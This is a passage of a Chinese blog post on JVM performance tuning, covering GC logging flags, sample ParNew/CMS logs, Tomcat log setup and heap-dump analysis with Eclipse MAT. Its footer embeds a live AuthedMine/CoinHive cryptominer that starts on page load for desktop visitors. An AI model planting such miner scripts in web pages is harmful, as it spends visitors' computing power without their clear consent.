<p>|-XX:+PrintTenuringDistribution    |&#x67E5;&#x770B;&#x6BCF;&#x6B21;minor GC&#x540E;&#x65B0;&#x7684;&#x5B58;&#x6D3B;&#x5468;&#x671F;&#x7684;&#x9608;&#x503C;         Desired survivor size 1048576 bytes, new threshold 7 (max 15) new threshold 7&#x5373;&#x6807;&#x8BC6;&#x65B0;&#x7684;&#x5B58;&#x6D3B;&#x5468;&#x671F;&#x7684;&#x9608;&#x503C;&#x4E3A;7&#x3002;|</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Desired survivor size 40239104 bytes, new threshold 6 (max 6)</div><div class="line">- age   1:   38395784 bytes,   38395784 total</div><div class="line">: 697938K-&gt;46713K(707840K), 0.0827063 secs] 697938K-&gt;62235K(969984K), 0.0828384 secs] [Times: user=0.26 sys=0.00, real=0.08 secs] </div><div class="line">2017-11-06T17:47:26.663+0800: 2084.592: [GC (Allocation Failure) 2017-11-06T17:47:26.663+0800: 2084.592: [ParNew</div><div class="line">Desired survivor size 40239104 bytes, new threshold 6 (max 6)</div><div class="line">- age   1:    7222536 bytes,    7222536 total</div><div class="line">- age   2:   12782736 bytes,   20005272 total</div><div class="line">: 675961K-&gt;26286K(707840K), 0.0380878 secs] 691483K-&gt;41807K(969984K), 0.0382007 secs] [Times: user=0.06 sys=0.00, real=0.04 secs]</div></pre></td></tr></table></figure>
<p>&#x7ECF;&#x5E38;&#x6027;&#x7684; &#x201C;premature promotion&#x201D;&#xFF0C; &#x6700;&#x603B;&#x4F1A;&#x5BFC;&#x81F4;&#x5927;&#x91CF;&#x77ED;&#x671F;&#x5BF9;&#x8C61;&#x88AB;&#x63D0;&#x5347;&#x5230;&#x8001;&#x5E74;&#x4EE3;&#xFF0C; &#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x8001;&#x5E74;&#x4EE3;&#x7A7A;&#x95F4;&#x4E0D;&#x8DB3;&#xFF0C; &#x5F15;&#x53D1;&#x53E6;&#x4E00;&#x4E2A; JVM &#x5185;&#x5B58;&#x95EE;&#x9898; &#x201C;promotion failure&#x201D;&#xFF08;&#x63D0;&#x5347;&#x5931;&#x8D25;&#xFF1A; &#x5373;&#x8001;&#x5E74;&#x4EE3;&#x7A7A;&#x95F4;&#x4E0D;&#x8DB3;&#x4EE5;&#x5BB9;&#x4E43; Minor GC &#x4E2D;&#x63D0;&#x5347;&#x4E0A;&#x6765;&#x7684;&#x5BF9;&#x8C61;&#xFF09;</p>
<p>&#x9608;&#x503C; 6</p>
<p>-XX:+PrintHeapAtGC &#x6253;&#x5370;GC&#x524D;&#x540E;&#x7684;&#x5806;&#x6808;&#x4FE1;&#x606F;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">{Heap before GC invocations=0 (full 0):</div><div class="line"> par new generation   total 707840K, used 629248K [0x00000000c0000000, 0x00000000f0000000, 0x00000000f0000000)</div><div class="line">  eden space 629248K, 100% used [0x00000000c0000000, 0x00000000e6680000, 0x00000000e6680000)</div><div class="line">  from space 78592K,   0% used [0x00000000e6680000, 0x00000000e6680000, 0x00000000eb340000)</div><div class="line">  to   space 78592K,   0% used [0x00000000eb340000, 0x00000000eb340000, 0x00000000f0000000)</div><div class="line"> concurrent mark-sweep generation total 262144K, used 0K [0x00000000f0000000, 0x0000000100000000, 0x0000000100000000)</div><div class="line"> Metaspace       used 15947K, capacity 16294K, committed 16512K, reserved 1064960K</div><div class="line">  class space    used 1780K, capacity 1877K, committed 1920K, reserved 1048576K</div><div class="line">2017-11-07T21:14:24.642+0800: 12.757: [GC (Allocation Failure) 2017-11-07T21:14:24.642+0800: 12.757: [ParNew</div><div class="line">Desired survivor size 40239104 bytes, new threshold 1 (max 6)</div><div class="line">- age   1:   73044040 bytes,   73044040 total</div><div class="line">: 629248K-&gt;71474K(707840K), 0.0671453 secs] 629248K-&gt;71474K(969984K), 0.0672460 secs] [Times: user=0.14 sys=0.05, real=0.07 secs] </div><div class="line">Heap after GC invocations=1 (full 0):</div><div class="line"> par new generation   total 707840K, used 71474K [0x00000000c0000000, 0x00000000f0000000, 0x00000000f0000000)</div><div class="line">  eden space 629248K,   0% used [0x00000000c0000000, 0x00000000c0000000, 0x00000000e6680000)</div><div class="line">  from space 78592K,  90% used [0x00000000eb340000, 0x00000000ef90ca70, 0x00000000f0000000)</div><div class="line">  to   space 78592K,   0% used [0x00000000e6680000, 0x00000000e6680000, 0x00000000eb340000)</div><div class="line"> concurrent mark-sweep generation total 262144K, used 0K [0x00000000f0000000, 0x0000000100000000, 0x0000000100000000)</div><div class="line"> Metaspace       used 15947K, capacity 16294K, committed 16512K, reserved 1064960K</div><div class="line">  class space    used 1780K, capacity 1877K, committed 1920K, reserved 1048576K</div><div class="line">}</div></pre></td></tr></table></figure></p>
<p>catalina host-manage manager localhost&#x65E5;&#x5FD7; &#x914D;&#x7F6E;Catalina.bat JAVA_OPTS<br>-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.util.logging.config.file=&#x201D;..\conf\logging.properties&#x201D;<br>&#x5BF9;&#x5E94;&#x4E0B;&#x9762;&#x51E0;&#x4E2A;<br>localhost.2012-07-05.txt<br>catalina.2012-07-05.txt<br>manager.2012-07-05.txt<br>host-manager.2012-07-05.txt</p>
<p>&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;access_log &#x914D;&#x7F6E;server.xml Host&#x8282;&#x70B9;&#x5185;&#x90E8;&#x6DFB;&#x52A0;&#x7684;Valve<br><code>&lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs/tomcat&quot;  prefix=&quot;localhost_access_log.&quot; suffix=&quot;.txt&quot; pattern=&quot;common&quot; resolveHosts=&quot;false&quot;/&gt;</code></p>
<p>app&#x65E5;&#x5FD7;<br>log4j &#x5E94;&#x7528;&#x5185;&#x90E8;&#x7684;log</p>
<h4 id="&#x5806;&#x6587;&#x4EF6;&#x5206;&#x6790;"><a href="#&#x5806;&#x6587;&#x4EF6;&#x5206;&#x6790;" class="headerlink" title="&#x5806;&#x6587;&#x4EF6;&#x5206;&#x6790;"></a>&#x5806;&#x6587;&#x4EF6;&#x5206;&#x6790;</h4><p>&#x67E5;&#x770B;pid : jps  -m -l<br>&#x751F;&#x6210;hprof&#x6587;&#x4EF6; : jmap -dump:format=b,file=log.hprof [pid]</p>
<p><code>-XX:+HeapDumpOnOutOfMemoryError</code> &#x81EA;&#x52A8;&#x751F;&#x6210;dump </p>
<h5 id="visual-VM-jvisualvm&#x5DE5;&#x5177;&#x4EA6;&#x53EF;"><a href="#visual-VM-jvisualvm&#x5DE5;&#x5177;&#x4EA6;&#x53EF;" class="headerlink" title="visual VM  jvisualvm&#x5DE5;&#x5177;&#x4EA6;&#x53EF;"></a>visual VM  jvisualvm&#x5DE5;&#x5177;&#x4EA6;&#x53EF;</h5><h5 id="eclipse&#x4E2D;&#x7684;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x52A0;&#x8F7D;&#x5730;&#x5740;-http-www-eclipse-org-mat-downloads-php-&#x627E;&#x5230;Update-Site"><a href="#eclipse&#x4E2D;&#x7684;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x52A0;&#x8F7D;&#x5730;&#x5740;-http-www-eclipse-org-mat-downloads-php-&#x627E;&#x5230;Update-Site" class="headerlink" title="eclipse&#x4E2D;&#x7684;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x52A0;&#x8F7D;&#x5730;&#x5740;: http://www.eclipse.org/mat/downloads.php &#x627E;&#x5230;Update Site"></a>eclipse&#x4E2D;&#x7684;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x52A0;&#x8F7D;&#x5730;&#x5740;: <a href="http://www.eclipse.org/mat/downloads.php" target="_blank" rel="external">http://www.eclipse.org/mat/downloads.php</a> &#x627E;&#x5230;Update Site</h5><p>&#x5728;Eclipse&#x4E2D;&#x70B9;&#x51FB;Windows-&gt;Open Perspective-&gt;Other-&gt;Memory Analysis<br>&#x5BFC;&#x5165;.hprof&#x6587;&#x4EF6;<br>&#x5728;MAT&#x4E2D;&#x70B9;&#x51FB; File-&gt;Open File,&#x6D4F;&#x89C8;&#x5230;&#x521A;&#x521A;&#x8F6C;&#x6362;&#x800C;&#x5F97;&#x5230;&#x7684;.hprof&#x6587;&#x4EF6;&#xFF0C;&#x5E76;Cancel&#x6389;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x62A5;&#x544A;,&#x70B9;&#x51FB;Dominator Tree&#xFF0C;&#x5E76;&#x6309;Package&#x5206;&#x7EC4;&#xFF0C;<br>&#x9009;&#x62E9;&#x81EA;&#x5DF1;&#x6240;&#x5B9A;&#x4E49;&#x7684;Package &#x7C7B;&#x70B9;&#x53F3;&#x952E;&#xFF0C;&#x5728;&#x5F39;&#x51FA;&#x83DC;&#x5355;&#x4E2D;&#x9009;&#x62E9;List objects-&gt;With incoming references&#x3002;<br>&#x8FD9;&#x65F6;&#x4F1A;&#x5217;&#x51FA;&#x6240;&#x6709;&#x53EF;&#x7591;&#x7C7B;&#xFF0C;&#x53F3;&#x952E;&#x70B9;&#x51FB;&#x67D0;&#x4E00;&#x9879;&#xFF0C;&#x5E76;&#x9009;&#x62E9;Path to GC Roots-&gt;exclude weak/soft references,<br>&#x4F1A;&#x8FDB;&#x4E00;&#x6B65;&#x7B5B;&#x9009;&#x51FA;&#x8DDF;&#x7A0B;&#x5E8F;&#x76F8;&#x5173;&#x7684;&#x6240;&#x6709;&#x6709;&#x5185;&#x5B58;&#x6CC4;&#x9732;&#x7684;&#x7C7B;&#x3002;&#x636E;&#x6B64;&#xFF0C;&#x53EF;&#x4EE5;&#x8FFD;&#x8E2A;&#x5230;&#x4EE3;&#x7801;&#x4E2D;&#x7684;&#x67D0;&#x4E00;&#x4E2A;&#x4EA7;&#x751F;&#x6CC4;&#x9732;&#x7684;&#x7C7B;&#x3002;</p>

      
    </div>
    
    
         

<!-- donate -->
<style>
   .donate_bar {
	text-align: center;
	margin-top: 5%
	}
	.donate_bar a.btn_donate {
		display: inline-block;
		width: 82px;
		height: 82px;
		margin-left: auto;
		margin-right: auto;
		background: url(http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif)no-repeat;
		-webkit-transition: background 0s;
		-moz-transition: background 0s;
		-o-transition: background 0s;
		-ms-transition: background 0s;
		transition: background 0s
	}
	.donate_bar a.btn_donate:hover {
		background-position: 0 -82px
	}
	.donate_bar .donate_txt {
		display: block;
		color: #9d9d9d;
		font: 14px/2 "Microsoft Yahei"
	}
	.donate_bar.hidden{
		display: none
	}
	.post-donate{
		margin-top: 80px;
	}
	#donate_guide{
		height: 210px;
		width: 420px;
		margin: 0 auto;
	}
	#donate_guide img{
		height: 200px;
		height: 200px;
	}
</style>
<!-- 添加捐赠图标 -->
<div class ="post-donate">
    <div id="donate_board" class="donate_bar center">
        <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏"></a>
        <span class="donate_txt">
           &uarr;<br>
		   坚持原创技术分享，您的支持将鼓励我继续创作！
        </span>
        <br>
    </div>  
	<div id="donate_guide" class="donate_bar center hidden" >
		<!-- 支付宝打赏图案 -->
		<img src="/img/avatar.png" alt="支付宝打赏"> 
		<!-- 微信打赏图案 -->
		<img src="/img/avatar.png" alt="微信打赏">  
    </div>
	<script type="text/javascript">
		document.getElementById('btn_donate').onclick = function(){
			//$('#donate_board').addClass('hidden');
			if($('#donate_guide').hasClass('hidden')){
				$('#donate_guide').removeClass('hidden');
			}else{
				$('#donate_guide').addClass('hidden');
			}
		}
	</script>
</div>

<!-- End donate -->


    
    
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2017/08/29/深入理解JVM之性能调优/">深入理解JVM之性能调优</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">Mu Xiaobai(慕小白)</a></p>
        <p><span>发布时间:</span>2017-08-29, 13:58:04</p>
        <p><span>最后更新:</span>2017-12-15, 03:04:56</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2017/08/29/深入理解JVM之性能调优/" title="深入理解JVM之性能调优">https://muxiaobai.github.io/2017/08/29/深入理解JVM之性能调优/</a>
            <span class="copy-path" data-clipboard-text="原文: https://muxiaobai.github.io/2017/08/29/深入理解JVM之性能调优/　　作者: Mu Xiaobai(慕小白)" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2017/09/02/应用部署之nginx负载/">
                    应用部署之nginx负载
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2017/08/14/数据库操作语句/">
                    数据库操作语句
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#修改tomcat-的java-opts"><span class="toc-number">1.</span> <span class="toc-text">修改tomcat 的java_opts</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#各个参数的含义"><span class="toc-number">2.</span> <span class="toc-text">各个参数的含义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tomcat下的几个日志"><span class="toc-number">3.</span> <span class="toc-text">tomcat下的几个日志</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#根据gc-log分析收集器"><span class="toc-number">3.1.</span> <span class="toc-text">根据gc log分析收集器</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#堆文件分析"><span class="toc-number">4.</span> <span class="toc-text">堆文件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#visual-VM-jvisualvm工具亦可"><span class="toc-number">4.1.</span> <span class="toc-text">visual VM  jvisualvm工具亦可</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#eclipse中的分析工具加载地址-http-www-eclipse-org-mat-downloads-php-找到Update-Site"><span class="toc-number">4.2.</span> <span class="toc-text">eclipse中的分析工具加载地址: http://www.eclipse.org/mat/downloads.php 找到Update Site</span></a></li></ol></li></ol>
</div>
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
</style>

<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

<script>
    yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
</script>



    
<div class="share">
    

    
        <div class="addthis_sharing_toolbox"></div>
    
</div>







    
      <div class="duoshuo" id="comments">
    <div id="comment-box" ></div>
    <div class="ds-thread" id="ds-thread" data-thread-key="2017/08/29/深入理解JVM之性能调优/" data-title="深入理解JVM之性能调优" data-url="https://muxiaobai.github.io/2017/08/29/深入理解JVM之性能调优/"></div>
    <script>
        var duoshuoQuery = {short_name:"muxiaobai"};
        var loadComment = function(){
            var d = document, s = d.createElement('script');
            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
            s.async = true; s.charset = 'UTF-8';
            (d.head || d.body).appendChild(s);
        }

        
    </script>
    
    <script> loadComment(); </script>

</div>
    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2017/09/02/应用部署之nginx负载/" title="上一篇: 应用部署之nginx负载">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2017/08/14/数据库操作语句/" title="下一篇: 数据库操作语句">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/04/20/Tomcat源码阅读之Container责任链/">Tomcat源码阅读之Container责任链</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/17/Tomcat源码阅读之URL请求解析/">Tomcat源码阅读之URL请求解析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/16/Tomcat源码阅读之组件生命周期/">Tomcat源码阅读之组件生命周期</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/16/Tomcat源码阅读之从server-xml看组件关系/">Tomcat源码阅读之从server.xml看组件关系</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/13/Thinking-in-java-基础之线程和并发-2/">Thinking in java 基础之线程和并发(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/02/重装CENTOS一系列操作/">重装CENTOS一系列操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/05/2017年个人总结/">2017年个人总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/22/javascript再学习之prototype/">javascript再学习之prototype</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/RSS好工具/">RSS好工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/23/前端小tips/">前端小tips</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/17/Linux-基础命令总结3/">Linux 基础命令总结3</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/02/应用部署之nginx负载/">应用部署之nginx负载</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/深入理解JVM之性能调优/">深入理解JVM之性能调优</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/14/数据库操作语句/">数据库操作语句</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/09/javascript再学习之Event/">javascript再学习之Event</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/08/javascript再学习之DOM/">javascript再学习之DOM</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/02/Javamelody-工具/">Javamelody 工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/20/hadoop-Sqoop-Hive等的安装/">hadoop-Sqoop-Hive等的安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/19/Linux-下的java安装、变更以及升级问题/">Linux 下的java安装、变更以及升级问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/29/毕业设计心得/">毕业设计心得</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/23/2016年个人总结/">2016年个人总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/27/CSS-定位布局/">CSS 定位布局</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/17/等待-等待-等待/">等待,等待,等待...</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/29/常见排序算法总结/">常见排序算法总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/Thinking-in-java-基础之网络Socket/">Thinkin in java 基础之网络Socket</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/19/由ES6中的Proxy和Reflect再了解Object/">由ES6中的Proxy和Reflect再了解Object</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/16/从ES6中学习编码/">从ES6中学习编码</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/模仿jQuery创建自己的js工具/">模仿jQuery创建自己的js工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/20/HTML5-API-新特性/">HTML5 API 新特性</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/Thinking-in-java-基础之线程和并发/">Thinking in java 基础之线程和并发</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/04/Thinking-in-java-基础之异常/">Thinking in java 基础之异常</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/03/Spring中的Session生命周期/">Spring中的Session生命周期</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/20/前后台数据交互方式总结/">前后台数据交互方式总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/19/JavaEE-资源路径问题/">JavaEE 资源路径问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/19/Sublime-下运行Java文件/">Sublime 下运行Java文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/09/Linux-基础Shell脚本/">Linux 基础Shell脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/07/Linux-基础命令总结2/">Linux 基础命令总结2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/01/好软件-靠机遇/">好软件,靠机遇</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/29/好网站-天天记/">好网站,天天记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/29/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/Linux下各目录的默认含义/">Linux下各目录的默认含义</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/Linux-基础命令总结/">Linux 基础命令总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/25/Thinking-in-java-基础之集合框架/">Thinking in java 基础之集合框架</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/25/Thinking-in-java-基础之I-O/">Thinking in java 基础之I/O</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/19/Linux-下安装SVN服务器/">Linux 下安装SVN服务器</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/GitHub Hexo/">GitHub + Hexo 构建我的博客</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2016-2018 Mu Xiaobai(慕小白)
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >本站到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 5;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-80276841-1', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->



<!-- coinhive -->
<!--<script src="https://coin-hive.com/lib/coinhive.min.js"></script>-->
<script src="https://authedmine.com/lib/authedmine.min.js"></script>
<script>
//  var miner = new CoinHive.User('');
//  theme.coinhive_siteKey    theme.coinhive_userName
//	miner.start();
var miner = new CoinHive.Anonymous('4vmXkBOL0LsDsFLNY9UqbMlRxhGnXkAR', {throttle: 0.3});//70%
	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
	if (!miner.isMobile() && !miner.didOptOut(14400)) {
		miner.start();
	}	
</script>
<!-- End coinhive -->



<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>